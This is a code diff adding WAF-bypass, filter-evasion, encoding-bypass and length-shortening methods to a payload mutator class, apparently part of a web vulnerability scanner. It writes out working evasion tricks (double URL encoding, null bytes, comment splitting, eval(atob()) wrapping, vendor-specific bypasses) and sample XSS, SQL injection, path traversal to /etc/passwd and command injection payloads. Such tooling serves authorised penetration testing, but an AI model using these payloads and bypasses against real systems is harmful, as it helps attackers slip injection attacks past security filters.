@@ -13,7 +13,8 @@ of base payloads including:
 
 import urllib.parse
 import logging
-from typing import List, Set, Dict, Any
+import re
+from typing import List, Set, Dict, Any, Optional
 import html as html_module
 
 logger = logging.getLogger(__name__)
@@ -466,3 +467,246 @@ class PayloadMutator:
             variations.append(base_payload.replace('SELECT', 'sElEcT'))
         
         return list(set(variations))
+
+    @staticmethod
+    def mutate_for_waf_bypass(payload: str, waf_type: Optional[str] = None) -> List[str]:
+        """
+        Generate WAF-specific bypass variants for the given payload.
+
+        Args:
+            payload:  Base payload to mutate.
+            waf_type: Optional WAF vendor hint ('cloudflare', 'mod_security',
+                      'imperva', 'akamai', etc.).  When provided, additional
+                      vendor-specific bypasses are included.
+
+        Returns:
+            List of WAF-bypass payload variants (deduplicated).
+        """
+        variants: Set[str] = {payload}
+
+        # Universal WAF bypass techniques
+        # 1. Comment-based whitespace replacement
+        variants.add(payload.replace(' ', '/**/'))
+        variants.add(payload.replace(' ', '%09'))   # Tab
+        variants.add(payload.replace(' ', '%0a'))   # Newline
+        variants.add(payload.replace(' ', '%0d%0a'))
+
+        # 2. Case mixing
+        variants.add(payload.upper())
+        variants.add(payload.lower())
+        mixed = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
+        variants.add(mixed)
+
+        # 3. URL encoding variants
+        try:
+            variants.add(urllib.parse.quote(payload, safe=''))
+            variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
+        except Exception:
+            pass
+
+        # 4. Null-byte variants
+        variants.add(payload + '%00')
+        variants.add(payload + '\x00')
+
+        # 5. HTTP parameter pollution hint (add a junk prefix/suffix)
+        variants.add(payload + '&foo=bar')
+        variants.add('foo=bar&' + payload)
+
+        # Vendor-specific extras
+        if waf_type:
+            wt = waf_type.lower()
+            if 'cloudflare' in wt:
+                # Cloudflare tends to block on keyword patterns; use Unicode look-alikes
+                variants.add(payload.replace('<', '\uff1c').replace('>', '\uff1e'))
+            elif 'mod_security' in wt or 'modsecurity' in wt:
+                # ModSecurity: try chunked-comment splits
+                variants.add(re.sub(r'([a-zA-Z]{4,})', lambda m: m.group(0)[:2] + '/**/' + m.group(0)[2:], payload))
+            elif 'imperva' in wt or 'incapsula' in wt:
+                variants.add(payload + ';--')
+
+        return list(variants)
+
+    @staticmethod
+    def mutate_for_filter_evasion(payload: str, filtered_patterns: List[str]) -> List[str]:
+        """
+        Generate variants of *payload* that avoid the specific filtered strings.
+
+        Args:
+            payload:           Base payload.
+            filtered_patterns: List of string patterns that are known to be
+                               filtered/blocked by the target.
+
+        Returns:
+            List of mutated payloads that try to avoid the filtered strings.
+        """
+        variants: Set[str] = {payload}
+        current = payload
+
+        for pattern in filtered_patterns:
+            if not pattern or pattern not in current:
+                continue
+            pat_lower = pattern.lower()
+
+            # Strategy 1: comment-split the filtered token
+            for i in range(1, len(pattern)):
+                split = pattern[:i] + '/**/' + pattern[i:]
+                variants.add(current.replace(pattern, split))
+
+            # Strategy 2: HTML entity encode the filtered chars
+            encoded = ''.join(f'&#x{ord(c):02x};' for c in pattern)
+            variants.add(current.replace(pattern, encoded))
+
+            # Strategy 3: URL-encode the filtered string
+            try:
+                url_enc = urllib.parse.quote(pattern, safe='')
+                variants.add(current.replace(pattern, url_enc))
+                double_enc = urllib.parse.quote(url_enc, safe='')
+                variants.add(current.replace(pattern, double_enc))
+            except Exception:
+                pass
+
+            # Strategy 4: Case variation of the token
+            if pat_lower != pattern and pat_lower.isalpha():
+                variants.add(current.replace(pattern, pattern.swapcase()))
+
+            # Strategy 5: Insert null byte inside the token
+            null_split = pattern[:len(pattern) // 2] + '%00' + pattern[len(pattern) // 2:]
+            variants.add(current.replace(pattern, null_split))
+
+        return list(variants)
+
+    @staticmethod
+    def mutate_for_encoding_bypass(payload: str, encoding_type_stripped: str) -> List[str]:
+        """
+        Generate payloads using alternative encodings when a particular encoding
+        scheme has been stripped by the target.
+
+        Args:
+            payload:               Base payload.
+            encoding_type_stripped: The encoding type that was stripped.
+                                   Supported values: 'url', 'double_url',
+                                   'html_entity', 'base64', 'unicode'.
+
+        Returns:
+            List of alternatively-encoded payloads.
+        """
+        variants: Set[str] = {payload}
+
+        enc = (encoding_type_stripped or '').lower().replace('-', '_').replace(' ', '_')
+
+        if enc in ('url', 'percent'):
+            # URL encoding stripped → try double-URL, HTML entity, unicode escape
+            try:
+                variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
+            except Exception:
+                pass
+            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))
+            variants.add(''.join(f'\\u{ord(c):04x}' for c in payload))
+
+        elif enc in ('double_url', 'double_percent'):
+            # Double-URL stripped → try HTML entity, full hex, unicode
+            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))
+            variants.add(''.join(f'%{ord(c):02x}' for c in payload))
+
+        elif enc in ('html_entity', 'html', 'entity'):
+            # HTML entities stripped → try URL, JavaScript hex, unicode
+            try:
+                variants.add(urllib.parse.quote(payload, safe=''))
+            except Exception:
+                pass
+            variants.add(''.join(f'\\x{ord(c):02x}' for c in payload))
+            variants.add(''.join(f'\\u{ord(c):04x}' for c in payload))
+
+        elif enc == 'unicode':
+            # Unicode stripped → try URL encoding and base64 via eval
+            try:
+                variants.add(urllib.parse.quote(payload, safe=''))
+            except Exception:
+                pass
+            import base64 as _b64
+            try:
+                b64 = _b64.b64encode(payload.encode()).decode()
+                variants.add(f'eval(atob("{b64}"))')
+            except Exception:
+                pass
+
+        elif enc == 'base64':
+            # Base64 stripped → try URL and HTML entity
+            try:
+                variants.add(urllib.parse.quote(payload, safe=''))
+            except Exception:
+                pass
+            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))
+
+        else:
+            # Unknown — apply all encodings
+            try:
+                variants.add(urllib.parse.quote(payload, safe=''))
+                variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
+            except Exception:
+                pass
+            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))
+
+        return list(variants)
+
+    @staticmethod
+    def mutate_for_length_constraint(payload: str, max_length: int) -> List[str]:
+        """
+        Generate shorter equivalent payloads that fit within *max_length* characters.
+
+        The method attempts progressively more aggressive shortening strategies
+        while trying to preserve the payload's core effect.
+
+        Args:
+            payload:    Base payload (may be longer than max_length).
+            max_length: Maximum allowed payload length in characters.
+
+        Returns:
+            List of shortened payload variants, all <= max_length characters
+            (or an empty list if none could be produced).
+        """
+        if max_length <= 0:
+            return []
+
+        variants: List[str] = []
+
+        # Already fits?
+        if len(payload) <= max_length:
+            variants.append(payload)
+            return variants
+
+        # Strategy 1: Simple truncation
+        truncated = payload[:max_length]
+        if truncated:
+            variants.append(truncated)
+
+        # Strategy 2: Remove optional comments/whitespace
+        compact = re.sub(r'/\*.*?\*/', '', payload, flags=re.DOTALL)
+        compact = re.sub(r'\s+', ' ', compact).strip()
+        if len(compact) <= max_length:
+            variants.append(compact)
+
+        # Strategy 3: Well-known short equivalents for common payload types
+        short_equiv: Dict[str, List[str]] = {
+            'alert': ['alert(1)', 'alert`1`'],
+            'script': ['<script>alert(1)', '<svg/onload=alert(1)>'],
+            'onerror': ['<img src=x onerror=alert(1)>'],
+            'UNION': ["' UNION SELECT NULL--", "1 UNION SELECT NULL--"],
+            'etc/passwd': ['../etc/passwd', '../../etc/passwd'],
+            'system': [';id', '`id`', '$(id)'],
+        }
+        for trigger, shorts in short_equiv.items():
+            if trigger.lower() in payload.lower():
+                for s in shorts:
+                    if len(s) <= max_length:
+                        variants.append(s)
+
+        # Deduplicate and return only those that fit
+        seen: Set[str] = set()
+        result: List[str] = []
+        for v in variants:
+            if v and v not in seen and len(v) <= max_length:
+                seen.add(v)
+                result.append(v)
+
+        return result
